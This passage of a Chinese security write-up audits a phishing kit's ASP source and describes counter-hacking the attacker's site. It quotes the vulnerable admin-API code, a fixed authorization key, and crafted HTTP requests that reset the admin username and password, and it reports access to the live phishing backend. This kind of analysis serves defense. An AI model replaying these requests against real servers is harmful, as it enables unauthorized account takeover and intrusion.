'39dc0e09acb949e9369083ca020d044e6e1016505cc0505e6bf19bbbf8835cb7' 
真实环境测试不需要二级密码也可以修改管理员密码，可能是跟钓鱼页面
源码用的攻击者都使用同一个授权 key 有关系。二级密码验证部分的代码被注
释了。这个故事告诉我，白嫖虽然香，但也容易出问题~。 
原后台虽然有个登录框会向远程服务器地址发 HTTP 请求获取二级密码做
验证。但是我从 ZY.DLL 提取到的二级密码获取网址已经挂了。所以这里的测试
不需要二级密码验证也可以正常登录。 
越权 2-越权修改用户名 
第 2 处越权是发现可以通过授权 key 修改管理员密码之后，顺着这个线索
又发现通过授权 key 可以做很多操作。看文件名，这套钓鱼源码框架似乎还可
以通过 API 文件操作修改账户信息。比如 Ckzz_manager_api.asp 5 行~38 行。如
果修改密码失败，还可以用 key 值修改用户名。也就意味着就算管理员改了
admin 默认名账户，我依旧把改掉管理员的账户成 admin，再改管理员密码。 
# 修改用户名操作，先接收要修改的管理员名字 
if Request.QueryString("action")="edit_username" then 
username = trim(request("username")) 
key = trim(request("key")) 
if username="" then 
response.write "error" 
response.end() 
end if 
reg_sql="select * from ckzz_reg" 
set reg_rs=Server.CreateObject("ADODB.Recordset") 
reg_rs.open reg_sql,conn,1,1 
# key 参数与数据库表里的 ckzz_gen_key 对比，如果错误就结束后续操作 
if reg_rs("ckzz_gen_key")<>key then 
response.write "error" 
response.end() 
end if 
# 修改管理员账户 
set rs = Server.CreateObject("ADODB.RecordSet") 
sql = "select * from Manager where id=1" 
rs.open sql,conn,1,3 
rs("zy_username")=username 
rs.update 
rs.close 
# 增加一条数据库记录 
set rs = nothing 
set reg_rs = nothing 
set rss=Server.CreateObject("adodb.recordset") 
sql="select * from log" 
rss.open sql,conn,2,3 
rss.addnew 
rss("user_name")="WWW.CKZZ.NET" 
rss("user_ip")=request.ServerVariables("REMOTE_ADDR") 
rss("times")=now() 
rss("zhuangtai")="程序管理主站修改后台帐户，新帐户为："&username 
rss.update 
response.write "ok" 
response.end() 
end if 
对比数据库确实成功修改了用户名，为了修改用户名构造的 HTTP 数据包
如下： 
GET 
/ckzz_manager_api.asp?action=edit_username&username=admin&key=94ebb
60031c67eb0b42774de007dad3b HTTP/1.1 
Host: localhost:2301 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, 
like Gecko) Chrome/70.0.3538.110 Safari/537.36 
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,im
age/apng,*/*;q=0.8 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Connection: close 
越权 3-越权修改密码 
前面的代码已经可以看出通过 API 文件操作可以修改账户
Ckzz_manager_api.asp。继续分析 Ckzz_manager_api.asp 39 行~72 行，发现还
是可以用 key 值修改密码。 
# 接收要修改的密码 
if Request.QueryString("action")="edit_password" then 
password = trim(request("password")) 
key = trim(request("key")) 
if password="" then 
response.write "error" 
response.end() 
end if 
reg_sql="select * from ckzz_reg" 
set reg_rs=Server.CreateObject("ADODB.Recordset") 
reg_rs.open reg_sql,conn,1,1 
# key 参数与数据库表里的 ckzz_gen_key 对比，如果错误就结束后续操作 
if reg_rs("ckzz_gen_key")<>key then 
response.write "error" 
response.end() 
end if  
# 修改 ID=1 的记录里的密码 
set rs = Server.CreateObject("ADODB.RecordSet") 
sql = "select * from manager where id=1" 
rs.open sql,conn,1,3 
rs("zy_password")=sha256(base64Encode(sha256(password))) 
rs.update 
rs.close 
set rs = nothing 
set reg_rs = nothing 
set rss=Server.CreateObject("adodb.recordset") 
sql="select * from log" 
rss.open sql,conn,2,3 
rss.addnew 
rss("user_name")="WWW.CKZZ.NET" 
rss("user_ip")=request.ServerVariables("REMOTE_ADDR") 
rss("times")=now() 
rss("zhuangtai")="程序管理主站修改后台密码，新密码为："&password 
rss.update 
response.write "ok" 
response.end() 
end if 
构造数据包，用 admin1 的密文是 
171da850864661785aadecc3c725ef378f514cc823cedbdd427ce7fd4522923d
。对比数据库里的密文值，又修改成功了： 
GET 
/ckzz_manager_api.asp?action=edit_password&password=admin1&key=94eb
b60031c67eb0b42774de007dad3b HTTP/1.1 
Host: localhost:2301 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, 
like Gecko) Chrome/70.0.3538.110 Safari/537.36 
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,im
age/apng,*/*;q=0.8 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Connection: close 
越权 4-弱条件修改用户名&密码 
第 4 处越权修改用户名和密码的漏洞。只要判断是不是有 cookie 值而不需
要登录成功也可以执行修改账户密码的操作。 
仔细分析 ckzz_manager.asp 这个文件，。10 行~40 行代码。ID 为空就越权
修改用户表第一条记录的用户密码。ID 不为空还能越权修改用户名，具体代码
如下： 
# 接收参数为 edit_manager 
if Request.QueryString("action")="edit_manager" then 
id = trim(request.form("masterid")) 
password = trim(request.form("password")) 
repassword = trim(request.form("repassword")) 
# 如果 repassword 跟 password 参数相等，并且不为空就通过验证 
if password=repassword and repassword<>"" then 
set rs = Server.CreateObject("ADODB.RecordSet") 
sql = "select * from manager where id=1" 
rs.open sql,conn,1,3 
# 等于空就修改密码 
if id="" then 
rs("zy_password")=sha256(base64Encode(sha256(password))) 
rs.update 
rs.close 
set rs = nothing 
set rss=server.CreateObject("adodb.recordset") 
sql="select * from log" 
rss.open sql,conn,2,3 
rss.addnew 
# 赋值 session("admin") 
rss("user_name")=session("admin") 
rss("user_ip")=request.ServerVariables("REMOTE_ADDR") 
rss("times")=now() 
rss("zhuangtai")="修改后台密码，新密码："&password 
rss.update 
end if 
# 不等于空就修改用户名和密码 
if id<>"" then 
rs("zy_username")=id 
rs("password")=sha256(base64Encode(sha256(password))) 
rs.update 
rs.close 
set rs = nothing 
构造数据包： 
POST /ckzz_manager.asp?action=edit_manager HTTP/1.1 
Host: localhost:2301 
Content-Length: 41 
Cache-Control: max-age=0 
Origin: http://localhost:2301 
Upgrade-Insecure-Requests: 1 
Content-Type: application/x-www-form-urlencoded 
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, 
like Gecko) Chrome/70.0.3538.110 Safari/537.36 
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,im
age/apng,*/*;q=0.8 
Referer: http://localhost:2301/index.asp 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Cookie: 
GGOQPPUJGYTZLLPQEVMT=FTTGSOBVCLRDXIIQDKCTHFNCTPAUBWNVQGWEUSID; 
ts_uid=9255500360; 
LQAZPFPBDVYRXSJYFBEM=GFGVTJKZPZBGXXZGGLRZKJGYXRXWWFJTMGHNRCJR; 
GFVJPNNMAPEHZFPDTCDN=SKALNLNSTBIIOSPSFRENTXXFTKBMJPQDJBGXMTEU; 
ZZZUNOAQTQJRYRVYWWME=DDCJYWLVVADMRTDDDJZJCLOJCKPITYYAABBMRTES; 
QCUMJQUFSFTTAOOFXLYS=ABSXGDZGTYUFCFSSEUVZJQHIOGWJLAAMYPUWVSYF; 
QRPHUYXBKFAJADLUAPMZ=INJNKFQTDNRYVBLMJEPUEQRBLGFDSXYZRGZVYWRW; 
cs=Robot/%3FXTWJBTDNNQVRCQHHCOFLZMOGDLRGEKXVPLTUAIHC; 
ZBDUWICVXKRMTPZCQEHZ=SPISPZEULDQPJHRMCIBLPVISLZKWHABMYOANDKYK; 
DHDYCBOINVIOMKIPOKSG=FEFZNNVESNTMDLTZGNDDXDPHFWNBMTHUCTSZKOPG 
Connection: close 
masterid=&password=admin&repassword=admin 
触发这个漏洞要经过/include/Check.asp 文件 2 行~6 行的验证。可是这个
条件其实是在访问登录后台 index.asp 页面的时候有过赋值
session("fileget")=Server.MapPath(".")。这样的话只要把 index.asp 的验证 cookie
替换到我构造的数据包里就能实现任意修改用户名和密码了，不再受之前那几
个越权改密码还需要授权 key 的限制。只要访问下管理员后台首页得到会话
值，/include/Check.asp 文件 2 行~6 行的验证代码如下： 
if session("fileget")<>Server.MapPath(".") then 
Session.Abandon() 
Response.Write("") 
Response.end 
rs.close 
三、梳理攻击者信息  
进了后台后先记录下后台登录 IP：1xx.xxx.xxx.xxx、xxx.xxx.xxx.2xx，信封 XX
封 
四、同 C 段资产扫描 
通过端口、中间件信息扫描获取同类型钓鱼网站的范围。 
五、发件邮箱判断受控 
翻发件邮箱里的 IP：XXX.XXX.XX.XX 反查绑定的域名发现是一个公司的网
站，应该是正常的。而直接访问是通达 OA？看起来很像是国内正常单位被搞
了作为跳板。 
再后续反查钓鱼网站域名的访问量、Whois 得到注册人 QQ 就不展开了。 
六、总结 
总结其实是很重要的，我把所有尝试失败的过程都写进去，因为顺畅的过
程记录未必是最好的。只是这样的方法更适合我自己。这次反制成功的线路复
盘是这样的。 
1、WEB 80 端口扫描不出来敏感信息，扫描到不同端口再尝试扫描网页文
件。得到攻击者后台 
2、通过后台的“紫缘设计工作室(WWW.CKZZ.NET)” 的字符串，在百度
网盘找到源码 
3、审计常规 SQL 注入漏洞、上传漏洞发现没有可以利用的地方，转向越
权漏洞，发现可以修改管理员密码可以进去后台 
4、钓鱼源码里面有一个授权 KEY 是固定的。可以用来修改管理员密码 
5、不知道管理员用户名的情况下，可以用授权 KEY 修改管理员用户名 
6、API 接口文件也可以调用授权 KEY 修改管理员密码 
7、后台改密码文件只验证有没有 cookie 值存在作为判断修改密码条件,而
不判断 cookie 是不是成功登录状态 
8、通过上线信封来判断受害者身份和数量、IP 地址 
9、通过管理员登录后台 IP 地区判断攻击者的 IP